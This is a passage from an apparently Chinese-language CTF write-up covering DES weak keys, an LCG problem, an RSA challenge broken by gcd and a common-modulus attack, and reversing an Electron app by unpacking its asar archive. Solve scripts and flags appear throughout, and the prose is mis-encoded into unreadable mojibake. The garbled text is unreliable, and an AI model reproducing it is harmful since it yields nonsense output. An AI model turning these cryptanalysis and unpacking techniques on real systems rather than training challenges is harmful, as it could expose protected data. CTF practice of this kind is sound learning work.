class="comment">#b&#x27;flag&#123;Hello_CTF&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ç¬¬äºŒç§æ–¹æ³•</p><p>GrobneråŸºæ±‚è§£å¤šé¡¹å¼å¤šä¸ªæ ¹ï¼Œä½†æ˜¯ä¸ä¼šï¼Œç»™ä¸ªDç¥çš„é“¾æ¥QAQ</p><p><a href="https://dexterjie.github.io/2023/07/05/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81-LCG/">LCG | DexterJieâ€™Blog</a></p><h3 id="EzDES">EzDES</h3><p>ä¸€å¼€å§‹æ²¡æƒ³åˆ°QAQ</p><p><a href="https://lightless.me/archives/DES-Weak-Keys.html">DES å¼±å¯†é’¥ - lightless blog</a>çœ‹çœ‹ä½¬çš„blog</p><blockquote><p>æœ‰å››ä¸ªå¼±å¯†é’¥æ˜¯ç»å¯¹ä¸èƒ½ä½¿ç”¨çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x01\x01\x01\x01\x01\x01\x01\x01</span><br><span class="line">\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE</span><br><span class="line">\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1</span><br><span class="line">\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸è€ƒè™‘æ ¡éªŒä½çš„å¯†é’¥ï¼Œä¸‹é¢å‡ ä¸ªä¹Ÿæ˜¯å±äºå¼±å¯†é’¥çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF</span><br><span class="line">\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0</span><br><span class="line">\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨å¼±å¯†é’¥ï¼ŒPC1 è®¡ç®—çš„ç»“æœä¼šå¯¼è‡´è½®å¯†é’¥å…¨éƒ¨ä¸º 0ï¼Œå…¨éƒ¨ä¸º 1 æˆ–å…¨éƒ¨ 01 äº¤æ›¿ã€‚<br>å› ä¸ºæ‰€æœ‰çš„è½®å¯†é’¥éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸” DES æ˜¯ Feistel ç½‘ç»œçš„ç»“æ„ï¼Œè¿™å°±å¯¼è‡´åŠ å¯†å‡½æ•°æ˜¯è‡ªåç›¸ (self-inverting) çš„ï¼Œç»“æœå°±æ˜¯åŠ å¯†ä¸€æ¬¡çœ‹èµ·æ¥æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœå†åŠ å¯†ä¸€æ¬¡å°±å¾—åˆ°äº†æ˜æ–‡ã€‚</p></blockquote><blockquote><h2 id="éƒ¨åˆ†å¼±å¯†é’¥">éƒ¨åˆ†å¼±å¯†é’¥</h2><p>éƒ¨åˆ†å¼±å¯†é’¥æ˜¯æŒ‡åªä¼šåœ¨è®¡ç®—è¿‡ç¨‹ä¸­äº§ç”Ÿä¸¤ä¸ªä¸åŒçš„å­å¯†é’¥ï¼Œæ¯ä¸€ä¸ªåœ¨åŠ å¯†çš„è¿‡ç¨‹ä¸­ä½¿ç”¨ 8 æ¬¡ã€‚è¿™å°±æ„å‘³ç€è¿™å¯¹å¯†é’¥ K1 å’Œ K2 æœ‰å¦‚ä¸‹æ€§è´¨ï¼š<br><img src="https://upload.wikimedia.org/math/0/e/c/0ec16658b1f5ae9031cb4993692794dc.png" alt="éƒ¨åˆ†å¼±å¯†é’¥æ€§è´¨"></p><p>6 ä¸ªå¸¸è§çš„éƒ¨åˆ†å¼±å¯†é’¥å¯¹</p><ul><li>0x011F011F010E010E and 0x1F011F010E010E01</li><li>0x01E001E001F101F1 and 0xE001E001F101F101</li><li>0x01FE01FE01FE01FE and 0xFE01FE01FE01FE01</li><li>0x1FE01FE00EF10EF1 and 0xE01FE01FF10EF10E</li><li>0x1FFE1FFE0EFE0EFE and 0xFE1FFE1FFE0EFE0E</li><li>0xE0FEE0FEF1FEF1FE and 0xFEE0FEE0FEF1FEF1</li></ul><p>OpenSSL ä¸­å¯¹å¼±å¯†é’¥çš„æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">119</span> <span class="type">static</span> <span class="type">const</span> DES_cblock weak_keys[NUM_WEAK_KEY]=&#123;</span><br><span class="line"><span class="number">120</span>     <span class="comment">/* weak keys */</span></span><br><span class="line"><span class="number">121</span>     &#123;<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">122</span>     &#123;<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">123</span>     &#123;<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">124</span>     &#123;<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">125</span>     <span class="comment">/* semi-weak keys */</span></span><br><span class="line"><span class="number">126</span>     &#123;<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">127</span>     &#123;<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">128</span>     &#123;<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">129</span>     &#123;<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">130</span>     &#123;<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">131</span>     &#123;<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">132</span>     &#123;<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">133</span>     &#123;<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">134</span>     &#123;<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">135</span>     &#123;<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">136</span>     &#123;<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">137</span>     &#123;<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><h2 id="æœ‰å¼±å¯†é’¥çš„åŠ å¯†ç®—æ³•">æœ‰å¼±å¯†é’¥çš„åŠ å¯†ç®—æ³•</h2><ul><li>DES</li><li>RC4</li><li>IDEA</li><li>Blowfish</li></ul></blockquote><p>æ‘˜æŠ„å®ŒQAQï¼Œå†æ ¹æ®æç¤º</p><p>äºŒæ¬¡åŠ å¯†å¾—åˆ°æ˜æ–‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;t\xe4f\x19\xc6\xef\xaaL\xc3R&#125;\x08;K\xc9\x88\xa6|\nF\xc3\x12h\xcd\xd3x\xc3(\x91\x08\x841\xca\x8b\xc1\x94\xb5\x9f[\xcd\xc6\x9f\xf9\xf6\xca\xf5\x1a\xda\x16\xcf\x89\x154\xa1\xfe\xc5\x16\xcf\x89\x154\xa1\xfe\xc5&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;0101010101010101&#x27;</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc = des.encrypt(pad(flag,<span class="number">64</span>))</span><br><span class="line"><span class="built_in">print</span>(enc[:enc.find(<span class="string">b&#x27;&#125;&#x27;</span>)+<span class="number">1</span>])</span><br><span class="line"><span class="comment">#b&#x27;DRKCTF&#123;We4k_K3y_1s_V3ry_D4nger0us_In_DES&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="MidRSA">MidRSA</h3><div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">è¿™é“é¢˜æ²¡å†™å®Œ</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_Key1</span>(<span class="params">ebits</span>):</span><br><span class="line">    e = [getPrime(ebits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">message,e</span>):</span><br><span class="line">    n = gmpy2.next_prime(bytes_to_long(message) &lt;&lt; <span class="number">300</span>)</span><br><span class="line">    m = getPrime(<span class="number">256</span>)</span><br><span class="line">    c = [<span class="built_in">int</span>(<span class="built_in">pow</span>(m,e[i],n)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e))]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_Key2</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = [random.getrandbits(nbits // <span class="number">4</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">return</span> n,e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">message,e,n</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    c = [<span class="built_in">int</span>(<span class="built_in">pow</span>(m,e[i],n)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e))]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">    </span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;DRKCTF&#123;&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">flag2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">ebits = <span class="number">7</span></span><br><span class="line">e1 = generate_Key1(ebits)</span><br><span class="line">cipher1 = encrypt1(flag1,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cipher1 =&quot;</span>,cipher1)</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">n,e2 = generate_Key2(nbits)</span><br><span class="line">cipher2 = encrypt2(flag2,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cipher2 =&quot;</span>,cipher2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e1 = [109, 71, 109, 73]</span></span><br><span class="line"><span class="string">cipher1 = [36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080, 36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871]</span></span><br><span class="line"><span class="string">e2 = [79572758141493570128961125255246129069540961757778793209698370333142346488381, 80555585862127636800866563977080055603517001358195529410497461746213789997225, 44651921320695090688745333790065512192118202496468714141526113242887125432380]</span></span><br><span class="line"><span class="string">cipher2 = [58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057, 16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337, 80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546]</span></span><br><span class="line"><span class="string">n = 93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€éƒ¨åˆ†</p>è¿™é‡Œæœ‰ä¸¤ä¸ªcï¼ŒçŸ¥é“næ˜¯m<<300ï¼Œåªè¦æ‰¾åˆ°æ¨¡æ•°nï¼Œå°±æ‰¾åˆ°äº†mï¼Œæ„é€ $c_i=m^{e_i} \mod n$æ”¹å†™æˆ${c_i}^{e_j}={{m^{e_i}}^{e_j}} ={c_j}^{e_i}\mod n$<p>è¿™æ ·ä¸¤æ•°ä¹‹å·®å°±æ˜¯knï¼Œå†æ¥ä¸€ä¸ªknï¼Œæ±‚gcdå³å¯</p><p>ç¬¬äºŒéƒ¨åˆ†</p><p>è¿™é‡Œé‡çœ‹ä¸€ä¸‹å…±æ¨¡æ”»å‡»å’ŒCRTï¼š</p><p><a href="https://www.cnblogs.com/ailanxier/p/13370753.html">ä¸­å›½å‰©ä½™å®šç†(CRT)åŠå…¶æ‰©å±•(EXCRT)è¯¦è§£ - ailanxier - åšå®¢å›­ (cnblogs.com)</a></p><p>è¿™é‡Œè¦æƒ³åˆ°ä¸‰ä¸ªeå¯¹åº”ä¸‰ä¸ªæ–¹ç¨‹ï¼Œä¸èƒ½ç®€å•å½“æˆgcd(e1,e2,e3)</p><p>æŠŠå®ƒå½“æˆä¸¤æ¬¡å…±æ¨¡æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from prism import *</span></span><br><span class="line"><span class="comment"># from math import *</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e1 = [<span class="number">109</span>, <span class="number">71</span>, <span class="number">109</span>, <span class="number">73</span>]</span><br><span class="line">cipher1 = [<span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080</span>, <span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871</span>]</span><br><span class="line"></span><br><span class="line">d1 = cipher1[<span class="number">0</span>]**e1[<span class="number">1</span>] - cipher1[<span class="number">1</span>]**e1[<span class="number">0</span>]</span><br><span class="line">d2 = cipher1[<span class="number">2</span>]**e1[<span class="number">3</span>] - cipher1[<span class="number">3</span>]**e1[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">n = gcd(d1,d2)</span><br><span class="line"></span><br><span class="line">m1 = n&gt;&gt;<span class="number">300</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(m1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e2 = [<span class="number">79572758141493570128961125255246129069540961757778793209698370333142346488381</span>, <span class="number">80555585862127636800866563977080055603517001358195529410497461746213789997225</span>, <span class="number">44651921320695090688745333790065512192118202496468714141526113242887125432380</span>]</span><br><span class="line">c2 = [<span class="number">58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057</span>, <span class="number">16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337</span>, <span class="number">80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546</span>]</span><br><span class="line">n = <span class="number">93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">  g, x, y = egcd(a, m)</span><br><span class="line">  <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">_,s1, s2 = gmpy2.gcdext(e2[<span class="number">0</span>],e2[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c2[<span class="number">0</span>] = modinv(c2[<span class="number">0</span>], n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2[<span class="number">1</span>] = modinv(c2[<span class="number">1</span>], n)</span><br><span class="line"><span class="comment"># print(t)</span></span><br><span class="line">m2 = <span class="built_in">pow</span>(c2[<span class="number">0</span>], s1, n) * <span class="built_in">pow</span>(c2[<span class="number">1</span>], s2, n) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2))</span><br><span class="line"><span class="comment">#b&#x27;DRKCTF&#123;5d0b96e8-e069-4378-82e7-120e4b761a0b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="REVERSE">REVERSE</h2><h3 id="elec-go">elec_go</h3><p>ä½¬å‡ºçš„é¢˜ï¼Œç¬¬ä¸€æ¬¡è§</p><p>æ ¹æ®</p><p><a href="https://www.52pojie.cn/thread-1847258-1-1.html">Electronç¼–å†™çš„exe é€†å‘æ€è·¯ - ã€è„±å£³ç ´è§£åŒºã€ - å¾çˆ±ç ´è§£ - LCG - LSG |å®‰å“ç ´è§£|ç—…æ¯’åˆ†æ|www.52pojie.cn</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install asar -<span class="keyword">g</span></span><br><span class="line"><span class="keyword">cd</span> apps</span><br><span class="line">asar extract <span class="keyword">app</span>.asar <span class="keyword">app</span> <span class="comment">//è§£å‹æ‹¿åˆ°æºç </span></span><br><span class="line">asar pack <span class="keyword">app</span> <span class="keyword">app</span>.asar <span class="comment">//é‡æ–°æ‰“åŒ…</span></span><br></pre></td></tr></table></figure><p>æ‰“å¼€jsæºä»£ç ï¼Œæœ‰ä¸€ä¸ªbase64ï¼Œè§£å¯†ä¹‹åå‘ç°æ˜¯aesï¼Œä½†æ˜¯ä¸çŸ¥é“keyï¼Œç›´æ¥å†™ä¸€ä¸ª</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  dialog.<span class="title function_">showMessageBox</span>(&#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">`k3y çš„å€¼æ˜¯ï¼š<span class="subst">$&#123;k3y.toString()&#125;</span>`</span>,</span><br><span class="line">    <span class="attr">buttons</span>: [<span class="string">&#x27;OK&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>é‡æ–°æ‰“åŒ…ï¼Œæ‹¿åˆ°keyçš„å€¼ï¼Œåœ¨çº¿è§£å¯†</p><p><img src="https://s2.loli.net/2024/05/30/ugIApJS6XdPciaH.png" alt="image-20240530225931951"></p><h3 id="flower-tea">flower_tea</h3><p>åœ¨è¿™é‡Œè¯´ä¸€ä¸‹å‡ºé¢˜æ€è·¯å§QAQ</p><p>è¿™ä¸ªé¢˜æœ¬æ¥æ˜¯æƒ³è€ƒä¸€ä¸‹å»èŠ±æŒ‡ä»¤çš„ï¼Œæ²¡æƒ³åˆ°æœ‰ä½¬ç›´æ¥è°ƒå‡ºæ¥äº†ï¼Œtql</p><p>èŠ±æŒ‡ä»¤åŸºæœ¬éƒ½å¾ˆèŒæ–°QAQï¼Œå¯¹æ ˆåšæ“ä½œæˆ–è€…callï¼Œretã€‚</p><p>æƒ³äº†ä¸€ä¸‹ï¼Œå¯èƒ½åè°ƒè¯•æ¯”èŠ±å‡ºçš„è¿˜å¥½ä¸€ç‚¹ã€‚æ¯•ç«Ÿx64çš„å’Œx86æœ‰ä¸€ç‚¹ä¸ä¸€æ ·ã€‚</p><p>æ„Ÿè§‰è¿˜æœ‰å¯ä»¥æ”¹è¿›çš„åœ°æ–¹ï¼š</p><p>éšè—äº¤å‰å¼•ç”¨-ç”¨å¤šçº§æŒ‡é’ˆæ¥éšè—äº¤å‰å¼•ç”¨<br>çœŸteaä¸­jmpä¿®æ­£ä¸ºjzå’Œjnzï¼Œè¿™æ ·èƒ½èµ·åˆ°ä¸€äº›æ··æ·†çš„ä½œç”¨<br>é˜²æ­¢é™„åŠ è°ƒè¯•-åœ¨scanfä¹‹åå†æ¬¡åˆ¤æ–­è°ƒè¯•çŠ¶æ€ï¼Œä¿®æ”¹hook</p><p>ä½†æ˜¯éƒ½ä¸ä¼šQAQï¼Œè¿˜æ˜¯è¦å¥½å¥½å­¦ï¼Œä¸‹é¢æŠ„çš„å®˜æ–¹wp</p><p>è§‚å¯Ÿmainå‡½æ•°ï¼š<br>ä¸»å‡½æ•°çš„å¤§æ¦‚æ˜¯è¿™æ ·ã€‚<br><img 